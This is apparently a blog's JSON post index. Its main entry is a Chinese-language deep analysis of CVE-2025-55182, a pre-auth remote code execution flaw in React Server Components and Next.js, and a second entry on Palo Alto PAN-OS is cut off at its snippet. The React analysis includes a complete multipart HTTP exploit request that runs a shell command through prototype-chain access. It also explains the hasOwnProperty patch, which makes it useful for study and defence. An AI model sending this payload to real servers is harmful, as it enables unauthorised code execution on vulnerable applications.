[
  
  {
    "title": "CVE-2025-55182 React Server Components 反序列化漏洞原理深度分析",
    "url": "/posts/CVE-2025-55182/",
    "categories": "vulnerability",
    "tags": "CVE",
    "date": "2025-12-05 11:33:00 +0800",
    





    
    "snippet": "一、漏洞概述            项目      内容                  CVE编号      CVE-2025-55182              漏洞类型      远程代码执行 (RCE)              漏洞组件      React Flight Protocol (react-server-dom-webpack)              受影响版...",
    "content": "一、漏洞概述            项目      内容                  CVE编号      CVE-2025-55182              漏洞类型      远程代码执行 (RCE)              漏洞组件      React Flight Protocol (react-server-dom-webpack)              受影响版本      react-server-dom-webpack 19.0.0 - 19.2.0, Next.js 15.x/16.x              CVSS评分      9.8 (Critical)              认证要求      无需认证 (Pre-auth)      二、React Server Components 技术背景2.1 什么是 React Server Components (RSC)React Server Components 是 React 18+ 引入的一种新型组件模型，允许组件在服务端渲染并将结果流式传输到客户端。与传统 SSR 不同，RSC 可以：  直接访问服务端资源：数据库、文件系统、内部 API  减少客户端 JavaScript 体积：服务端组件代码不会发送到客户端  保持交互性：与客户端组件无缝协作┌─────────────────────────────────────────────────────────────────┐│                    React Server Components 架构                  │├─────────────────────────────────────────────────────────────────┤│                                                                  ││  ┌──────────────┐         ┌──────────────┐                      ││  │   Browser    │ ←─────→ │   Server     │                      ││  │              │  HTTP   │              │                      ││  │ ┌──────────┐ │         │ ┌──────────┐ │                      ││  │ │ Client   │ │         │ │ Server   │ │                      ││  │ │Components│ │         │ │Components│ │                      ││  │ └──────────┘ │         │ └──────────┘ │                      ││  │      ↑       │         │      ↓       │                      ││  │      │       │         │  ┌────────┐  │                      ││  │      └───────┼─────────┼──│ Flight │  │                      ││  │   Flight     │         │  │Protocol│  │                      ││  │   Protocol   │         │  └────────┘  │                      ││  └──────────────┘         └──────────────┘                      ││                                                                  │└─────────────────────────────────────────────────────────────────┘2.2 什么是 React Server Functions (Server Actions)Server Functions（在 Next.js 中称为 Server Actions）是 React 19 引入的 RPC-over-HTTP 机制，允许客户端像调用本地函数一样调用服务端函数。2.2.1 Server Function 定义方式// app/actions.js'use server'  // 标记为 Server Functionexport async function submitForm(formData) {    // 这段代码只在服务端执行    const name = formData.get('name');    await db.users.create({ name });    return { success: true };}2.2.2 客户端调用方式// app/page.jsx (Client Component)'use client'import { submitForm } from './actions';export default function Form() {    async function handleSubmit(e) {        e.preventDefault();        const formData = new FormData(e.target);        // 看起来像本地调用，实际是 HTTP POST        const result = await submitForm(formData);    }    return &lt;form onSubmit={handleSubmit}&gt;...&lt;/form&gt;;}2.2.3 底层通信机制当客户端调用 submitForm(formData) 时，React 实际执行：1. 客户端序列化参数 → Flight Protocol 格式2. 发送 HTTP POST 请求到当前页面 URL3. 请求头包含 Next-Action: &lt;action-id&gt;4. 请求体是 multipart/form-data（Flight 格式）5. 服务端反序列化参数6. 执行对应的 Server Function7. 序列化返回值 → Flight Protocol 格式8. 客户端反序列化结果2.3 Server Action 请求格式详解2.3.1 HTTP 请求结构POST /page-url HTTP/1.1Host: example.comContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkNext-Action: 1a2b3c4d5e6f7890abcdef1234567890abcdef12Next-Router-State-Tree: [encoded-tree]------WebKitFormBoundary7MA4YWxkContent-Disposition: form-data; name=\"1_$ACTION_ID_1a2b3c...\"------WebKitFormBoundary7MA4YWxkContent-Disposition: form-data; name=\"0\"[\"$K1\"]------WebKitFormBoundary7MA4YWxk--2.3.2 关键 HTTP 头            Header      说明      示例                  Next-Action      Server Action 的唯一标识符（40字符哈希）      1a2b3c4d...              Content-Type      必须是 multipart/form-data      multipart/form-data; boundary=...              Next-Router-State-Tree      路由状态（可选）      [encoded]      2.3.3 Action ID 的生成Action ID 是 Server Function 的唯一标识符，由以下因素计算：// Next.js 内部生成逻辑（简化）actionId = hash(    filePath +          // 文件路径: \"app/actions.js\"    exportName +        // 导出名: \"submitForm\"    functionBody        // 函数体哈希);// 结果: \"1a2b3c4d5e6f7890abcdef1234567890abcdef12\"重要安全假设: Next.js 假设只有知道有效 Action ID 的请求才是合法的。但 CVE-2025-55182 证明这个假设是错误的——漏洞在验证 Action ID 之前就触发了。三、React Flight Protocol 深度解析3.1 什么是 Flight Protocol3.4 特殊引用前缀系统Flight 协议使用 $ 前缀系统来表示特殊值。当解析 JSON 时，如果字符串以 $ 开头，会进行特殊处理。3.4.1 完整前缀列表            前缀      名称      语法      作用      处理逻辑                  $      Chunk 引用      \"$123\"      引用 chunk 123 的解析值      getChunk(123).value              $@      原始 Chunk      \"$@123\"      获取 chunk 对象本身      getChunk(123) (不解引用)              $L      Lazy 引用      \"$L123\"      惰性加载的 chunk      返回 lazy wrapper              $F      Server Function      \"$F123\"      服务端函数引用      创建代理函数              $B      Blob 数据      \"$B123\"      二进制数据      formData.get(prefix + \"123\")              $K      FormData      \"$K123\"      FormData 引用      解析 FormData              $Q      Map 引用      \"$Q123\"      Map 数据结构      解析为 Map              $W      Set 引用      \"$W123\"      Set 数据结构      解析为 Set              $n      Number      \"$n123\"      大数字      BigInt(123)              $u      undefined      \"$undefined\"      undefined 值      undefined              $D      Date      \"$D2024-01-01\"      日期对象      new Date(...)              $$      转义      \"$$abc\"      字面量 $abc      \"$abc\" (去掉一个 $)      3.4.2 链式属性访问语法除了简单引用，Flight 还支持链式属性访问：// 语法: \"$&lt;chunkId&gt;:&lt;key1&gt;:&lt;key2&gt;:...\"// 示例: \"$1:user:profile:name\"// 等价于: getChunk(1).value.user.profile.name解析代码（漏洞所在）:function parseModelString(response, parentObj, key, value) {    if (value[0] === '$') {        switch (value[1]) {            case '$':                return value.slice(1);  // 转义            case '@':                // 原始 chunk 引用                return getChunk(response, parseInt(value.slice(2), 16));            case 'B':                // Blob 处理 ⚠️ 攻击利用点                var id = parseInt(value.slice(2), 16);                return response._formData.get(response._prefix + id);            // ... 其他类型            default:                // 链式引用: \"$1:key1:key2\"                var ref = value.slice(1);                var colonIdx = ref.indexOf(':');                if (colonIdx &gt; -1) {                    var id = parseInt(ref.slice(0, colonIdx), 16);                    var path = ref.slice(colonIdx + 1);                    var chunk = getChunk(response, id);                    // ⚠️ 漏洞: 直接访问属性链，无 hasOwnProperty 检查                    return loadServerReference(chunk, path);                }                return getChunk(response, parseInt(ref, 16));        }    }    return value;}3.4.3 $ vs $@ 的本质区别这是理解漏洞的关键：// 假设 Chunk 0 的原始数据是: '{\"name\": \"Alice\"}'// ===== \"$0\" - 普通引用 =====// 返回解析后的 JavaScript 值parseModelString(\"$0\")// 执行流程://   1. getChunk(0) → Chunk 对象//   2. 如果 status 是 \"resolved_model\"，调用 initializeModelChunk//   3. 返回 chunk.value (解析后的值)// 结果: { name: \"Alice\" }  ← 普通 JS 对象// ===== \"$@0\" - 原始 Chunk 引用 =====// 返回 Chunk 对象本身，不解析parseModelString(\"$@0\")// 执行流程://   1. getChunk(0) → Chunk 对象//   2. 直接返回（不调用 initializeModelChunk）// 结果:ReactPromise {    status: \"resolved_model\",    value: '{\"name\": \"Alice\"}',    reason: null,    _response: Response {...},    __proto__: ReactPromise.prototype  // ⚠️ 可访问原型链！}安全影响: $@ 让攻击者能获取内部 Chunk 对象，从而访问：  Chunk.__proto__ → ReactPromise.prototype  Chunk.__proto__.then → ReactPromise.prototype.then 方法  Chunk.__proto__.constructor → Object → Function3.5 关键函数详解3.5.1 getChunk - 获取或创建 Chunkfunction getChunk(response, id) {    var chunks = response._chunks;    var chunk = chunks.get(id);    if (!chunk) {        // Chunk 不存在，尝试从 FormData 获取        var formData = response._formData;        if (formData) {            var data = formData.get(response._prefix + id);            if (data != null) {                // 创建 resolved_model 状态的 Chunk                chunk = new ReactPromise(                    \"resolved_model\",  // status                    data,              // value (原始 JSON 字符串)                    id,                // reason (这里存 id)                    response           // response                );            }        }        if (!chunk) {            // 创建 pending 状态的 Chunk            chunk = createPendingChunk(response);        }        chunks.set(id, chunk);    }    return chunk;}漏洞利用点: 攻击者通过 FormData 提供的数据会被直接用于创建 Chunk，data 参数完全可控。3.5.2 initializeModelChunk - 解析 JSON 模型function initializeModelChunk(chunk) {    var response = chunk._response;    var value = chunk.value;  // 原始 JSON 字符串    try {        // 解析 JSON，过程中处理 $ 引用        var parsed = parseModel(response, value);        // 更新 Chunk 状态        chunk.status = \"fulfilled\";        chunk.value = parsed;    } catch (error) {        chunk.status = \"rejected\";        chunk.reason = error;    }}攻击利用: 攻击者可以构造特殊的 JSON，让 parseModel 执行危险操作。3.5.3 ReactPromise.prototype.then - thenable 接口ReactPromise.prototype.then = function(resolve, reject) {    var chunk = this;    switch (chunk.status) {        case \"fulfilled\":            // 已解析，直接返回值            if (resolve) resolve(chunk.value);            break;        case \"pending\":        case \"blocked\":            // 等待中，注册回调            if (resolve) chunk.value.push(resolve);            if (reject) chunk.reason.push(reject);            break;        case \"resolved_model\":            // ⚠️ 关键: 需要解析            initializeModelChunk(chunk);            // 解析后递归处理            if (chunk.status === \"fulfilled\") {                if (resolve) resolve(chunk.value);            } else if (chunk.status === \"rejected\") {                if (reject) reject(chunk.reason);            }            break;        case \"rejected\":            if (reject) reject(chunk.reason);            break;    }};攻击利用: 当 await 一个 thenable 对象时，JavaScript 会调用其 then 方法。攻击者构造一个假 Chunk 对象，设置 status: \"resolved_model\" 和恶意 value，当被 await 时会触发 initializeModelChunk。四、漏洞根本原因深度分析4.1 漏洞位置漏洞存在于 react-server-dom-webpack 包的 Flight 协议解析代码中，具体在处理链式属性引用时。4.2 漏洞代码分析// 简化的漏洞代码function loadServerReference(chunk, path) {    // path = \"key1:key2:key3\"    var keys = path.split(':');    var value = chunk.value;  // 起始值    for (var i = 0; i &lt; keys.length; i++) {        var key = keys[i];        // ⚠️ 漏洞: 直接使用方括号访问        // 没有检查 key 是否是对象自身属性        value = value[key];    }    return value;}4.3 为什么缺少 hasOwnProperty 是危险的4.3.1 JavaScript 原型链基础const obj = { name: \"test\" };// 自身属性obj.name                    // \"test\"obj.hasOwnProperty(\"name\")  // true// 继承属性（来自原型链）obj.toString                // [Function: toString]obj.hasOwnProperty(\"toString\")  // false ← 不是自身属性// __proto__ 是特殊属性obj.__proto__               // Object.prototypeobj.hasOwnProperty(\"__proto__\")  // false4.3.2 攻击者如何利用// 正常访问obj[\"name\"]                 // \"test\" ✓// 攻击者输入 \"__proto__\"obj[\"__proto__\"]            // Object.prototype ← 访问到原型！obj[\"__proto__\"][\"constructor\"]  // Objectobj[\"__proto__\"][\"constructor\"][\"constructor\"]  // Function!// 有 hasOwnProperty 检查时if (obj.hasOwnProperty(\"__proto__\")) {    return obj[\"__proto__\"];}// 不会执行，因为 __proto__ 不是自身属性4.4 原型链攻击向量4.4.1 获取 Function 构造函数// 任意对象都可以通过原型链获取 Functionconst anyObj = {};anyObj.__proto__                          // Object.prototype      .constructor                        // Object      .constructor                        // Function ← 获得！// 或者更直接anyObj.constructor.constructor            // Function// 利用 Function 执行代码const evil = Function(\"return process.mainModule.require('child_process').execSync('id')\");evil();  // 执行系统命令4.4.2 获取 Chunk.prototype.then这是漏洞利用的精妙之处：// Chunk 1 的值设为 \"$@0\"（原始 Chunk 引用）// 解析后，Chunk 1 的 value 是 Chunk 0 对象本身// 当访问 \"$1:__proto__:then\" 时:const chunk1Value = parseModelString(\"$@0\");// chunk1Value = ReactPromise { status, value, ... }chunk1Value.__proto__              // ReactPromise.prototype           .then                   // ReactPromise.prototype.then 方法！// 现在攻击者可以把这个方法赋给伪造对象的 then 属性4.5 完整攻击原语通过原型链，攻击者可以获取：            引用路径      获得的值      用途                  $1:__proto__:then      Chunk.prototype.then      让伪造对象成为合法 thenable              $1:constructor:constructor      Function      动态创建并执行代码              $1:__proto__:constructor      Object      获取 Object 构造函数              $1:__proto__:constructor:prototype      Object.prototype      访问所有对象的原型      五、完整利用链详解5.1 攻击目标攻击者的最终目标是在服务端执行任意代码。要实现这一目标，需要：  获取 Function 构造函数 - 用于动态创建可执行代码  找到一个”调用点” - 让创建的函数被执行  绑定恶意代码 - 将要执行的命令传入 Function5.2 攻击请求结构5.2.1 完整 HTTP 请求POST / HTTP/1.1Host: vulnerable-nextjs-app.comContent-Type: multipart/form-data; boundary=----FormBoundaryNext-Action: x------FormBoundaryContent-Disposition: form-data; name=\"0\"{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,\"value\":\"{\\\"then\\\":\\\"$B1337\\\"}\",\"_response\":{\"_prefix\":\"throw new Error(require('child_process').execSync('id').toString());\",\"_chunks\":\"$Q2\",\"_formData\":{\"get\":\"$1:constructor:constructor\"}}}------FormBoundaryContent-Disposition: form-data; name=\"1\"\"$@0\"------FormBoundaryContent-Disposition: form-data; name=\"2\"[]------FormBoundary--5.2.2 请求头分析            Header      值      作用                  Content-Type      multipart/form-data      Flight 协议使用 FormData 传输              Next-Action      x      任意值，触发 Server Action 处理流程      关键点: Next-Action: x 不是有效的 Action ID，但漏洞在验证 Action ID 之前就触发了！5.3 Payload 结构深度解析攻击 payload 由 3 个 Chunk 组成，每个都有特定作用：5.3.1 Chunk 0 - 伪造的 Chunk 对象（核心 Payload）{    \"then\": \"$1:__proto__:then\",    \"status\": \"resolved_model\",    \"reason\": -1,    \"value\": \"{\\\"then\\\":\\\"$B1337\\\"}\",    \"_response\": {        \"_prefix\": \"throw new Error(require('child_process').execSync('id').toString());\",        \"_chunks\": \"$Q2\",        \"_formData\": {            \"get\": \"$1:constructor:constructor\"        }    }}各字段详细解析:┌─────────────────────────────────────────────────────────────────────────┐│ 字段: \"then\": \"$1:__proto__:then\"                                       │├─────────────────────────────────────────────────────────────────────────┤│ 目的: 让伪造对象拥有真正的 Chunk.prototype.then 方法                      ││                                                                          ││ 解析过程:                                                                ││   \"$1:__proto__:then\"                                                   ││     ↓ 解析 $1                                                           ││   getChunk(1).value = \"$@0\" 的解析结果 = Chunk 0 对象本身                ││     ↓ 访问 __proto__                                                    ││   Chunk 0 对象.__proto__ = ReactPromise.prototype                       ││     ↓ 访问 then                                                         ││   ReactPromise.prototype.then = 真正的 then 方法 ✓                      ││                                                                          ││ 结果: 伪造对象的 then 属性 = ReactPromise.prototype.then                 ││       这让伪造对象成为一个\"合法\"的 thenable                              │└─────────────────────────────────────────────────────────────────────────┘┌─────────────────────────────────────────────────────────────────────────┐│ 字段: \"status\": \"resolved_model\"                                        │├─────────────────────────────────────────────────────────────────────────┤│ 目的: 当 then() 被调用时，触发 initializeModelChunk()                    ││                                                                          ││ 原理: ReactPromise.prototype.then 的实现:                               ││   switch (this.status) {                                                ││       case \"resolved_model\":                                            ││           initializeModelChunk(this);  // ← 会被触发！                  ││           break;                                                        ││   }                                                                     ││                                                                          ││ 结果: await 伪造对象时，会解析其 value 字段                              │└─────────────────────────────────────────────────────────────────────────┘┌─────────────────────────────────────────────────────────────────────────┐│ 字段: \"reason\": -1                                                      │├─────────────────────────────────────────────────────────────────────────┤│ 目的: 某些代码路径检查此字段，-1 避免类型错误                            │└─────────────────────────────────────────────────────────────────────────┘┌─────────────────────────────────────────────────────────────────────────┐│ 字段: \"value\": \"{\\\"then\\\":\\\"$B1337\\\"}\"                                  │├─────────────────────────────────────────────────────────────────────────┤│ 目的: 内层 payload，被 initializeModelChunk 解析                         ││                                                                          ││ 内容: {\"then\": \"$B1337\"}                                                ││                                                                          ││ 解析后: { then: &lt;$B1337 的结果&gt; }                                       ││                                                                          ││ $B1337 的处理:                                                          ││   case 'B':                                                             ││       return response._formData.get(response._prefix + \"1337\");         ││                                                                          ││ 由于 _formData.get = Function, _prefix = \"恶意代码;\"                    ││ 所以: Function(\"恶意代码;1337\") → 返回一个函数                          ││                                                                          ││ 最终: value 解析为 { then: &lt;恶意函数&gt; }                                 ││       这是一个 thenable，被 await 时会执行 then()                       │└─────────────────────────────────────────────────────────────────────────┘┌─────────────────────────────────────────────────────────────────────────┐│ 字段: \"_response\": {...}                                                │├─────────────────────────────────────────────────────────────────────────┤│ 目的: 伪造的 Response 对象，initializeModelChunk 会使用它               ││                                                                          ││ 子字段:                                                                 ││                                                                          ││ \"_prefix\": \"throw new Error(require('child_process').execSync('id')...);││   → 要执行的恶意代码（不以分号结尾，因为会拼接 ID）                      ││                                                                          ││ \"_chunks\": \"$Q2\"                                                        ││   → 指向空数组，避免遍历 _chunks 时报错                                  ││                                                                          ││ \"_formData\": {\"get\": \"$1:constructor:constructor\"}                      ││   → get 属性 = Function 构造函数                                        ││   → 解析: getChunk(1) → Chunk0对象 → constructor → Object → constructor ││                                      → Function                          │└─────────────────────────────────────────────────────────────────────────┘5.3.2 Chunk 1 - 原始 Chunk 引用\"$@0\"┌─────────────────────────────────────────────────────────────────────────┐│ 解析: \"$@0\"                                                             │├─────────────────────────────────────────────────────────────────────────┤│ $@ 前缀表示\"获取原始 Chunk 对象\"                                        ││                                                                          ││ 返回值: Chunk 0 的 ReactPromise 对象本身（不是解析后的值）               ││                                                                          ││ 结构:                                                                   ││ ReactPromise {                                                          ││     status: \"resolved_model\",                                           ││     value: '{\"then\":\"$1:__proto__:then\",...}',                         ││     _response: Response {...},                                          ││     __proto__: ReactPromise.prototype  ← 可访问原型链！                 ││ }                                                                       ││                                                                          ││ 用途:                                                                   ││   1. $1:__proto__:then → 获取 ReactPromise.prototype.then               ││   2. $1:constructor:constructor → 获取 Function 构造函数               │└─────────────────────────────────────────────────────────────────────────┘5.3.3 Chunk 2 - 空数组[]┌─────────────────────────────────────────────────────────────────────────┐│ 用途: 作为 _chunks 的值（通过 $Q2 引用）                                 │├─────────────────────────────────────────────────────────────────────────┤│ 原因: initializeModelChunk 可能会迭代 _response._chunks                 ││       提供空数组避免迭代时出现类型错误                                   │└─────────────────────────────────────────────────────────────────────────┘5.4 利用流程 - 逐步执行分析步骤 1: 请求进入 Next.js// next/dist/server/app-render/action-handler.jsexport async function handleAction(req, res, ...) {    // 1. 检查是否是 Server Action 请求    const actionId = req.headers['next-action'];  // \"x\"    if (!actionId) return;  // 不是 Action 请求    // 2. ⚠️ 关键: 先反序列化，再验证 Action ID    let boundActionArguments;    if (isMultipartAction) {        // 使用 Busboy 解析 multipart 数据        const formData = await parseMultipartFormData(req);        // 调用 Flight 协议反序列化        boundActionArguments = await decodeReplyFromBusboy(formData);        // ↑ 漏洞在这里触发，程序不会执行到下面    }    // 3. 验证 Action ID（永远不会执行到）    const action = await getAction(actionId);    if (!action) {        throw new Error('Invalid Server Action');    }}关键: 反序列化发生在验证 Action ID 之前，这是 Pre-auth 的原因。步骤 2: Flight 协议开始解析// react-server-dom-webpack/src/ReactFlightDOMServerNode.jsfunction decodeReplyFromBusboy(formData) {    // 创建 Response 对象    const response = createResponse(bundlerConfig, formData, \"\");    // 获取根 Chunk (ID=0)    const root = getChunk(response, 0);    // 返回 root，它是一个 thenable    return root;}步骤 3: getChunk 创建 Chunk 0function getChunk(response, id) {  // id = 0    let chunk = response._chunks.get(id);  // undefined    if (!chunk) {        // 从 FormData 获取数据        const data = response._formData.get(\"0\");        // data = '{\"then\":\"$1:__proto__:then\",...}'        // 创建 Chunk        chunk = new ReactPromise(            \"resolved_model\",  // status            data,              // value = 恶意 JSON 字符串            0,                 // reason = id            response           // response        );        response._chunks.set(0, chunk);    }    return chunk;  // 返回 Chunk 0}步骤 4: await 触发 then()// 在 action-handler.js 中const args = await decodeReplyFromBusboy(formData);//            ↑ await 一个 thenable 会调用其 then 方法// 实际执行:chunk0.then(resolve, reject);// chunk0 是真正的 ReactPromise，所以调用 ReactPromise.prototype.then步骤 5: initializeModelChunk 被调用// ReactPromise.prototype.thenChunk.prototype.then = function(resolve, reject) {    switch (this.status) {  // \"resolved_model\"        case \"resolved_model\":            initializeModelChunk(this);  // ← 触发！            break;    }};// initializeModelChunkfunction initializeModelChunk(chunk) {    const response = chunk._response;  // 真正的 Response    const json = chunk.value;  // '{\"then\":\"$1:__proto__:then\",...}'    // 解析 JSON    const parsed = parseModel(response, json);    // parsed = 伪造的 Chunk 对象    chunk.status = \"fulfilled\";    chunk.value = parsed;}步骤 6: 解析 Chunk 0 的 JSON - 获取 Chunk.prototype.then// parseModel 解析 JSON，遇到 \"$1:__proto__:then\"function parseModelString(response, value) {    // value = \"$1:__proto__:then\"    if (value[0] === '$') {        // 解析链式引用        var ref = value.slice(1);  // \"1:__proto__:then\"        var colonIdx = ref.indexOf(':');  // 1        var id = parseInt(ref.slice(0, colonIdx));  // 1        var path = ref.slice(colonIdx + 1);  // \"__proto__:then\"        // 获取 Chunk 1        var chunk1 = getChunk(response, 1);        // Chunk 1 的 value = '\"$@0\"'        // 解析后 = Chunk 0 对象本身        var value = resolveChunk(chunk1);  // Chunk 0 对象        // 遍历路径 \"__proto__:then\"        var keys = path.split(':');  // [\"__proto__\", \"then\"]        for (var key of keys) {            value = value[key];  // ⚠️ 没有 hasOwnProperty 检查！        }        // value[\"__proto__\"] = ReactPromise.prototype        // value[\"then\"] = ReactPromise.prototype.then        return value;  // 返回真正的 then 方法！    }}步骤 7: 解析 _response._formData.get - 获取 Function// 解析 \"$1:constructor:constructor\"var chunk1Value = resolveChunk(getChunk(1));  // Chunk 0 对象var value = chunk1Value;value = value[\"constructor\"];  // Object (因为 Chunk 0 是对象)value = value[\"constructor\"];  // Function!// 现在 _formData.get = Function 构造函数步骤 8: 构建完成的伪造对象// 解析完成后，Chunk 0 的 value 变成:const fakeChunk = {    then: ReactPromise.prototype.then,  // 真正的 then 方法    status: \"resolved_model\",    reason: -1,    value: '{\"then\":\"$B1337\"}',    _response: {        _prefix: \"throw new Error(require('child_process').execSync('id').toString());\",        _chunks: [],        _formData: {            get: Function  // Function 构造函数！        }    }};步骤 9: 外层 await 触发伪造对象的 then// initializeModelChunk 完成后，chunk0.value = fakeChunk// 但 fakeChunk 也是 thenable（有 then 方法）// 当处理完成后，会 await fakeChunkawait fakeChunk;// 这会调用:fakeChunk.then(resolve, reject);// 由于 fakeChunk.then === ReactPromise.prototype.then// 等价于:ReactPromise.prototype.then.call(fakeChunk, resolve, reject);步骤 10: 第二次 initializeModelChunk// ReactPromise.prototype.then 检查 this.status// fakeChunk.status === \"resolved_model\"// 所以再次调用 initializeModelChunkfunction initializeModelChunk(chunk) {  // chunk = fakeChunk    const response = chunk._response;  // 伪造的 _response！    const json = chunk.value;  // '{\"then\":\"$B1337\"}'    // 解析这个 JSON    const parsed = parseModel(response, json);    // 遇到 \"$B1337\"...}步骤 11: $B 处理器触发 RCE// parseModelString 解析 \"$B1337\"function parseModelString(response, value) {    // value = \"$B1337\"    if (value[0] === '$' &amp;&amp; value[1] === 'B') {        var id = value.slice(2);  // \"1337\"        // 调用 response._formData.get(response._prefix + id)        // response = fakeChunk._response (伪造的！)        // response._formData.get = Function        // response._prefix = \"throw new Error(...);\"        return response._formData.get(response._prefix + id);        // ↓ 等价于:        return Function(\"throw new Error(require('child_process').execSync('id').toString());1337\");    }}步骤 12: 创建恶意函数// Function 构造函数被调用const maliciousFunction = Function(    \"throw new Error(require('child_process').execSync('id').toString());1337\");// 这创建了一个函数:function anonymous() {    throw new Error(require('child_process').execSync('id').toString());    1337  // 这行语法正确但不会执行}步骤 13: 函数被执行 - RCE！// parseModel 返回:const innerResult = {    then: maliciousFunction  // 函数对象};// innerResult 是 thenable（then 是函数）// 当被 await 时:await innerResult;// JavaScript 会调用:innerResult.then(resolve, reject);// 等价于:maliciousFunction(resolve, reject);// 函数执行！// require('child_process').execSync('id') 在服务器上运行！// 命令执行结果通过 throw Error 返回给攻击者5.5 完整调用栈HTTP POST /    │    ▼handleAction()    │    ▼decodeReplyFromBusboy()    │    ▼getChunk(0) ─────────────────────────────────────────────┐    │                                                     │    ▼                                                     │await chunk0 ← chunk0.then()                             │    │                                                     │    ▼                                                     │ReactPromise.prototype.then()                            │    │ status === \"resolved_model\"                        │    ▼                                                     │initializeModelChunk(chunk0)                             │    │                                                     │    ▼                                                     │parseModel('{\"then\":\"$1:__proto__:then\",...}')          │    │                                                     │    ├──→ 解析 \"$1:__proto__:then\"                        │    │      │                                              │    │      ▼                                              │    │    getChunk(1) → 解析 \"$@0\" → Chunk0 对象 ─────────┘    │      │    │      ▼    │    Chunk0.__proto__ → ReactPromise.prototype    │      │    │      ▼    │    ReactPromise.prototype.then ← 返回    │    ├──→ 解析 \"$1:constructor:constructor\"    │      │    │      ▼    │    Chunk0.constructor.constructor → Function ← 返回    │    ▼chunk0.value = fakeChunk（伪造对象）    │    ▼await fakeChunk ← fakeChunk.then()    │    ▼ReactPromise.prototype.then.call(fakeChunk)    │ fakeChunk.status === \"resolved_model\"    ▼initializeModelChunk(fakeChunk)    │ 使用伪造的 fakeChunk._response    ▼parseModel('{\"then\":\"$B1337\"}')    │    ├──→ 解析 \"$B1337\"    │      │    │      ▼    │    response._formData.get(response._prefix + \"1337\")    │      │    │      ▼    │    Function(\"恶意代码;1337\")    │      │    │      ▼    │    返回恶意函数    │    ▼result = { then: maliciousFunction }    │    ▼await result ← result.then()    │    ▼maliciousFunction() 被调用    │    ▼require('child_process').execSync('id') 执行    │    ▼RCE 成功！命令在服务器执行！六、为什么是 Pre-auth 漏洞6.1 Next.js Server Action 处理流程┌─────────────────────────────────────────────────────────────────────────┐│                    Next.js Server Action 处理流程                        │├─────────────────────────────────────────────────────────────────────────┤│                                                                          ││  HTTP 请求进入                                                           ││       │                                                                  ││       ▼                                                                  ││  ┌─────────────────┐                                                    ││  │ 检查 Next-Action│ ← Header 存在即进入 Action 处理                    ││  │ Header 是否存在 │                                                    ││  └────────┬────────┘                                                    ││           │                                                              ││           ▼                                                              ││  ┌─────────────────┐                                                    ││  │ 反序列化请求体   │ ← ⚠️ 漏洞在此触发！                               ││  │ (Flight Protocol)│                                                   ││  └────────┬────────┘                                                    ││           │                                                              ││           ▼                                                              ││  ┌─────────────────┐                                                    ││  │ 验证 Action ID  │ ← 永远不会执行到                                   ││  │ (40字符哈希)    │                                                    ││  └────────┬────────┘                                                    ││           │                                                              ││           ▼                                                              ││  ┌─────────────────┐                                                    ││  │ 执行 Server     │ ← 永远不会执行到                                   ││  │ Function        │                                                    ││  └─────────────────┘                                                    ││                                                                          │└─────────────────────────────────────────────────────────────────────────┘6.2 代码证明// next/dist/server/app-render/action-handler.js (简化)async function handleAction(req, res) {    const actionId = req.headers['next-action'];    // 第一步: 解析 multipart 数据（如果是 multipart 请求）    if (contentType?.includes('multipart/form-data')) {        const busboy = Busboy({ headers: req.headers });        // 收集表单数据...        // ⚠️ 关键: 这里调用 Flight 协议反序列化        // 漏洞在这一步触发，RCE 在这里发生        const boundActionArguments = await decodeReplyFromBusboy(            body,            webNextRequest.headers,            temporaryReferences        );        // 以下代码永远不会执行，因为上面已经 RCE 或抛出异常    }    // 第二步: 验证 Action ID    const action = await getActionFromId(actionId);    if (!action) {        throw new ActionNotFoundError();  // 永远不会到达    }    // 第三步: 执行 Action    return await action.apply(null, boundActionArguments);  // 永远不会到达}6.3 安全假设失效Next.js 的安全模型假设：  ✓ Action ID 是随机的 40 字符哈希  ✓ 攻击者无法猜测有效的 Action ID  ✗ 错误假设: 反序列化是安全的，不需要在验证前进行实际情况:  反序列化过程本身就可以触发代码执行  不需要知道任何有效的 Action ID  只需要发送带有 Next-Action header 的请求七、漏洞修复分析7.1 官方补丁React 团队在多处添加了 hasOwnProperty 检查：// packages/react-server-dom-webpack/src/ReactFlightServerReference.jsfunction requireModule(metadata) {    var moduleExports = __webpack_require__(metadata[ID]);-   return moduleExports[metadata[NAME]];+   if (hasOwnProperty.call(moduleExports, metadata[NAME])) {+       return moduleExports[metadata[NAME]];+   }+   return undefined;}// 类似的修复应用于属性访问的其他位置function getProperty(obj, key) {-   return obj[key];+   if (hasOwnProperty.call(obj, key)) {+       return obj[key];+   }+   return undefined;}7.2 修复原理const obj = { name: \"test\" };// 修复前（存在漏洞）:obj[\"__proto__\"]                    // → Object.prototype ← 可访问！obj[\"constructor\"]                  // → Object ← 可访问！// 修复后:if (hasOwnProperty.call(obj, \"__proto__\")) {    return obj[\"__proto__\"];}// hasOwnProperty 返回 false，不会访问原型链// 返回 undefined，攻击链断裂7.3 为什么 hasOwnProperty 可以防御            属性      obj[key]      hasOwnProperty.call(obj, key)      来源                  name      \"test\"      true      自身属性              __proto__      Object.prototype      false      继承              constructor      Object      false      继承              toString      [Function]      false      继承      hasOwnProperty 只返回 true 对于对象自身定义的属性，不包括从原型链继承的属性。八、总结8.1 漏洞概述CVE-2025-55182 是一个影响 React Server Components 和 Next.js 的严重远程代码执行漏洞。8.2 关键技术点            方面      详情                  根本原因      Flight 协议解析属性时缺少 hasOwnProperty 检查              利用方式      通过 __proto__ 访问原型链，获取 Function 构造函数              触发点      $@ 前缀获取原始 Chunk 对象 + $B 前缀触发函数调用              Pre-auth      漏洞在验证 Action ID 之前触发      8.3 利用链总结原型链访问 → 获取 Chunk.prototype.then → 构造伪造 Chunk    → 获取 Function 构造函数 → $B 触发 Function 调用    → thenable 模式执行函数 → RCE九、参考资料  React Security Advisory: https://github.com/facebook/react/security/advisories  Next.js Security Advisory: https://github.com/vercel/next.js/security/advisories  React Flight Protocol: https://github.com/facebook/react/tree/main/packages/react-server  Server Actions Documentation: https://nextjs.org/docs/app/building-your-application/data-fetching/server-actions-and-mutations"
  },
  
  {
    "title": "From CVE-2024-0012 to CVE-2024-9474  Analysis and Reflections on Palo Alto",
    "url": "/posts/pa/",
    "categories": "vulnerability, Palo-Alto-Networks-PAN-OS",
    "tags": "Palo-Alto-Networks-PAN-OS, RCE",
    "date": "2025-04-24 11:33:00 +0800",
    





    
    "snippet": "This article was first published on our team’s. Click here to read the Chinese version. https://mp.weixin.qq.com/s/6kuuU0WcrWqI-hw2PSoYmAIntroductionThis paper is a vulnerability analysis review. 2...",
